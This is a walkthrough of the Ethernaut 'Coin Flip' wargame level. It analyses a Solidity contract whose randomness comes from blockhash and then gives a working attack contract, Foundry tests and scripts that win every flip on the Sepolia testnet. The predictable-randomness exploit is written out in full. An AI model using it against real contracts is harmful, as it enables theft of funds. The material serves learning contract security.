# Ethernaut Level 3 - Coin Flip

I won't repeat the creation process from yesterday; today we dive straight into the third level: Coin Flip.
Why not follow the levels in order? Because learning this way is more interesting.

## Level Goal

This is a coin flipping game where you need to guess the outcome correctly in a row. To complete this level, you need to use your psychic abilities to guess correctly 10 times consecutively.
**Goal: Guess Heads or Tails correctly 10 times.**

## Analyze the Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

We can see three variables defined:
1.  `uint256 public consecutiveWins;` The number of consecutive wins.
2.  `uint256 lastHash;` The hash value used to calculate the previous coin flip.
3.  `uint256 FACTOR = 57896044......;` This is the factor used to determine if the coin is Heads or Tails.

Okay, let's look at the `flip` function.
The first line is `uint256 blockValue = uint256(blockhash(block.number - 1));`
This uses the block height, subtracts one, and takes the hash value to represent the value of this block.

```solidity
        if (lastHash == blockValue) {
            revert();
        }
```
This is interesting. To prevent you from flipping the coin 10 times in the same block, it directly checks if `lastHash` is the same as the current block value. If so, it reverts and returns an error.

```solidity
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
```
If they are different, it records the current block value to `lastHash`, then divides `blockValue` by `FACTOR` (that huge number above). It takes the integer part: if less than 1, it's 0; if greater, it's 1. Finally, it checks if it's 1.
Because of the unpredictability of hash values, it is very difficult to predict whether `blockValue` is larger or smaller than `FACTOR`.

```solidity
        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
```
This checks if the result matches the guess. If it matches, the consecutive win count is incremented by 1. If not, it resets to 0.

## Cracking Strategy

Let's analyze how to do this.
My first instinct was to just flip 10 times and count on luck.
We know the probability of guessing correctly each time is 1/2.
The calculation formula is:
(1/2)^10, which is 1 / 1024, approximately 0.0977%.
If we try one set (10 flips) per day on average, it would take about 2.8 years to succeed once.
So relying on luck is not an option.

Let's analyze further. As mentioned incorrectly before, guessing 10 times in one block won't work either because the same hash will cause a revert.
At this moment, I thought of a method. Since we can get the block information within a contract, and `FACTOR` is also given to us...
**Can't we calculate whether it's Heads or Tails in our own contract?**
If so, wouldn't we never lose?
The logic seems sound, so let's get to work.

## Writing the Hack Contract

We need to write a contract to crack this one. I'll call it `coinFlipHack`.
First, we need to import the `CoinFlip` contract to act as an interface, which is easier to use than defining an interface.
Next, we write the content of this contract.
We define a `FACTOR`, which should be consistent with the original contract's `FACTOR`.
Then write a `guess` function to replicate the original contract's flow to guess Heads or Tails, and then pass it into the contract we need to interact with.
I set the parameter to be the `CoinFlip` contract address so that this contract can be reused.

Let's look at the code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract coinFlipHack {

    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 

    uint public consecutiveWins = 0;

    function guess(address coinFlipAddress) public {
        CoinFlip coinf = CoinFlip(coinFlipAddress);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool result = coinFlip == 1 ? true : false;
        coinf.flip(result);
        consecutiveWins = coinf.consecutiveWins();
    }
}
```

A very simple contract.

## Writing Tests

Okay, now we need to start writing tests to ensure it runs without issues.

First, we need to define two things:
1.  `CoinFlip` itself, because our `CoinFlipHack` needs to interact with it.
2.  `coinFlipHack`.

Furthermore, we need to set an address, which will be the attacker's address.
Then write the `setUp` function.
We are not using `fork` today. Why?
Because in Foundry Fork mode, for non-existent future blocks, `blockhash` returns 0.
Returning 0 twice in a row will trigger the check in the contract that disallows the same hash twice, causing a revert.
So we just test locally.
Instantiate the two contracts, then give the attacker some ether.

Next, write a `testGuess` function. Note that test functions must start with `test`, otherwise the compiler will default to no test functions when running tests.
Use `vm.roll(block.number + 1);` to increase the simulated block number; otherwise, it will get stuck on one number.
We write a loop, in which we use `hack.guess` and pass in the `coinFlip` address.
Finally, check if we have won 10 times, and finish.

OK, the logic is clear, let's write this script:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/coinFlipHack.sol";
import "../src/CoinFlip.sol";

contract coinFlipTest is Test {

    coinFlipHack hack;

    CoinFlip cf;

    address att = makeAddr("attacker");

    address cfAddress;

    function setUp() public {

        cf = new CoinFlip();
        cfAddress = address(cf);
        hack = new coinFlipHack();

        vm.deal(att, 10 ether);
    }


    function testGuess() public {

        vm.startPrank(att);

        for(uint i=0; i<10; i++){
            vm.roll(block.number + 1);
            hack.guess(cfAddress);
            console.log("Consecutive Wins: ", hack.consecutiveWins());
            console.log("Block Number: ", block.number);
        }

        require(hack.consecutiveWins() == 10, "Attack failed");

        vm.stopPrank();
    }

}
```

If you followed my naming and paths, you can run the following command directly:
`forge test --match-path test/coinflip.t.sol -vvvv`
Otherwise, you need to change the test filename.
If `Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.50ms (1.18ms CPU time)` appears, it means the test passed.

## Writing the Attack Script

Now let's write the script to make this attack effective.
First, we need to deploy the attack contract to Sepolia.

The script is as follows:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/coinFlipHack.sol";

contract CoinFlipH is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        coinFlipHack attack = new coinFlipHack();
        
        console.log("Attack Contract Deployed at:", address(attack));

        vm.stopBroadcast();

    }
}
```

This is a very simple deployment, no need to explain much. It will print a contract address. Note down this address, we will write it into the attack contract script later.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/coinFlipHack.sol";

contract CoinFlipH is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // Replace with the contract address on the Ethernaut webpage
        address CoinFlipAddress = 0x...;

        // Replace with the address of the attack contract just deployed
        address coinFlipHackAddr = 0x...;

        coinFlipHack hack = coinFlipHack(coinFlipHackAddr);

        vm.startBroadcast(privateKey);

        hack.guess(CoinFlipAddress);
        
        console.log("Attack successful", hack.consecutiveWins());
        
        vm.stopBroadcast();
    }
}
```

There's not much to say about this either; it's a direct attack.
Let's first test it locally using `forge script script/coinFlip.s.sol --rpc-url $SEPOLIA_RPC_URL`.
I set it to guess once per run, so you should see:
`Attack successful 1`

Next, run it ten times:
`forge script script/coinFlip.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`
And you're done.
Go back to the webpage and submit.
